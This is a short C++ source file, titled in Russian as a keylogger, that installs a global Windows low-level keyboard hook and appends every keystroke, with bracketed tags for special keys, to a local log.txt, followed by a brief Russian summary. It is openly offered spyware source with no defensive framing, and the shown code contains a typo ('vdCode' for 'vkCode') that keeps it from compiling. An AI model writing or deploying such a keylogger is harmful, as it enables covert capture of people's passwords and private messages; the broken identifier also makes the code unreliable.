**Windows Low-Level Keyboard Hook — Кейлоггер**


```cpp
#include <windows.h>
#include <fstream>
#include <string>
std::ofstream logFile;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbd->vkCode;
        logFile.open("log.txt", std::ios::app);
        if (vkCode == VK_RETURN) logFile << "[ENTER]\n";
        else if (vkCode == VK_SPACE) logFile << " ";
        else if (vkCode == VK_BACK) logFile << "[BKSP]";
        else if (vkCode == VK_TAB) logFile << "[TAB]";
        else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT)
            logFile << "[SHIFT]";
        else if (vkCode == VK_CONTROL) logFile << "[CTRL]";
        else if (vkCode == VK_MENU) logFile << "[ALT]";
        else {
            BYTE keyState[256];
            GetKeyboardState(keyState);
            char ch;
            if (ToAscii(vdCode, kbd->scanCode, keyState, (LPWORD)&ch, 0) == 1) {
                logFile << ch;
            }
        }
        logFile.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
    return 0;
}
Краткие заметки: WH_KEYBOARD_LL глобальный хук, спецклавиши с bracket-тегами, log.txt в режиме append.
